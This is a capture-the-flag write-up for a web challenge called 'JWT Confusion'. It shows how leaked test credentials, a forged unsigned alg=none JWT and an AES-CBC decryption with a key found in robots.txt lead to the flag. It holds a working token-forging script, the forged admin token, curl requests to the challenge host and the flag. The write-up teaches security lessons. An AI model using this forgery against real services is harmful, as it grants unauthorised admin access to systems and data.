# JWT Confusion

![Category](https://img.shields.io/badge/Category-Web-2563eb?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-f59e0b?style=flat-square)
![Bug](https://img.shields.io/badge/Bug-JWT%20alg%3Dnone-dc2626?style=flat-square)
![Crypto](https://img.shields.io/badge/Crypto-AES--CBC-7c3aed?style=flat-square)

> Objective: abuse a JWT validation mistake to become admin, then decrypt the hidden admin data.

## Executive Summary

The application used JWT cookies for authentication. A test account was leaked in an HTML comment, and the JWT used `RS256` for normal users.

The server accepted a forged token with `alg=none`, allowing an unsigned admin token. The admin panel then revealed an encrypted Base64 blob. A maintenance key from `robots.txt` was used to decrypt it with AES-CBC and recover the flag.

## Attack Path

| Step | Action | Result |
| --- | --- | --- |
| 1 | Read login page source | Test credentials leaked |
| 2 | Authenticate as `etudiant` | JWT session cookie issued |
| 3 | Decode JWT | Role was controlled by token payload |
| 4 | Forge `alg=none` token | Admin role accepted without signature |
| 5 | Access `/admin` | Encrypted blob disclosed |
| 6 | Read maintenance key | AES material recovered |
| 7 | Decrypt AES-CBC payload | Flag recovered |

## 1. Reconnaissance

```bash
curl -i https://csia-ctf26-jwt-confusion.chals.io/connexion
```

Useful HTML comment:

```html
<!-- dev-note: compte de test non supprime -> etudiant:csia2026 -->
```

Credentials:

```text
etudiant:csia2026
```

## 2. Login and JWT Collection

```bash
curl -i \
  -d "username=etudiant&password=csia2026" \
  https://csia-ctf26-jwt-confusion.chals.io/connexion
```

The response created a `session` cookie:

```html
document.cookie = "session=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

## 3. Token Inspection

```python
import base64
import json

token = "JWT_HERE"
header, payload, signature = token.split(".")

for part in [header, payload]:
    padded = part + "=" * (-len(part) % 4)
    print(json.loads(base64.urlsafe_b64decode(padded)))
```

Decoded header:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

Decoded payload:

```json
{
  "username": "etudiant",
  "role": "etudiant"
}
```

## 4. Exploitation: Unsigned Admin Token

The validation logic trusted the attacker-controlled JWT header. I switched the algorithm to `none` and changed the role to `admin`.

```bash
python3 - <<'PY'
import base64
import json

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64(json.dumps({"username": "admin", "role": "admin"}, separators=(",", ":")).encode())

print(f"{header}.{payload}.")
PY
```

Forged token:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

The trailing dot is required because it represents the empty signature segment.

## 5. Admin Panel Access

```bash
TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'

curl -i -H "Cookie: session=$TOKEN" \
  https://csia-ctf26-jwt-confusion.chals.io/admin
```

Admin-only data:

```html
<div class="mono">
yJ5BCW8nBTmJu0JluXOf1rJxZJ5V85uEFtFO8IpvP0uRiCna3KdJumcrEgQEgPpp
</div>
```

## 6. AES-CBC Decryption

The maintenance key was found through:

```text
robots.txt
```

Key material:

```text
pr0j3ct-m4int3n4nce
```

Crypto parameters:

| Parameter | Value |
| --- | --- |
| Mode | AES-CBC |
| Key | `MD5(pr0j3ct-m4int3n4nce)` |
| IV | `1234567890abcdef` |
| Ciphertext | Base64 blob from admin page |

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import md5
import base64

ciphertext = base64.b64decode(
    "yJ5BCW8nBTmJu0JluXOf1rJxZJ5V85uEFtFO8IpvP0uRiCna3KdJumcrEgQEgPpp"
)

key = md5(b"pr0j3ct-m4int3n4nce").digest()
iv = b"1234567890abcdef"

cipher = AES.new(key, AES.MODE_CBC, iv)
print(unpad(cipher.decrypt(ciphertext), 16).decode())
```

## Flag

```text
CSIA{jwt_c0nfus10n_CHDIIIIID_NTA_i}
```

## Lessons Learned

| Risk | Defensive fix |
| --- | --- |
| JWT header controls algorithm choice | Enforce the expected algorithm server-side |
| `alg=none` accepted | Reject unsigned tokens in production |
| Sensitive data exposed in admin | Reduce admin-side secret disclosure |
| Weak crypto construction | Avoid static IVs and ad-hoc key derivation |

